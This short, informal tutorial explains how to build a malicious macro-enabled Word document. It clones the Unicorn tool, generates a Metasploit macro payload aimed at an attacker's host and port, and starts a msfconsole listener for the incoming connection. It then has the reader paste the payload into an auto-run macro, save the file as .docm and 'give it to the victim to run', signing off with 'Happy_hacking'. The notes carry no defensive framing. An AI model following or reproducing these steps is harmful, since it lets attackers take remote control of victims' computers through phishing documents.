#Here we are going to see is creating the payload and insert it it into the docm
#These was done by macro command it was introduced in the microsoft-2007, it has certain command to execute

#First we need to dowload the unicorn from the git 
Link :https://github.com/trustedsec/unicorn


#To Download the file type
$git clone https://github.com/trustedsec/unicorn.git

#After that we need to give the permission to the file to run
chmod +x unicorn.py

#To run the python file
./unicorn.py <msf_payload path> <host ip> <port> type<like:macro> 

#It will create the two file by runing this command .txt and .rc
#The .rc file contain all the parameter for the msfconsole
#And the .txt file has the payload for the macro
#To run the .rc type...

$msfconsole -r unicorn.rc
#It will start to lesson for the incoming connection

#now we want to create the macro+docx->.docm
#open the office and edit the macro and save it as .docm
note:In the macro payload at the first line it has "sub auto_Open()" edit it to "sub autoOpen()" after you can save the file as (.docm)
#And give it to the victim to run

#In that payload at last you can also edit the mwessage and titel for the dailog box
#Happy_hacking
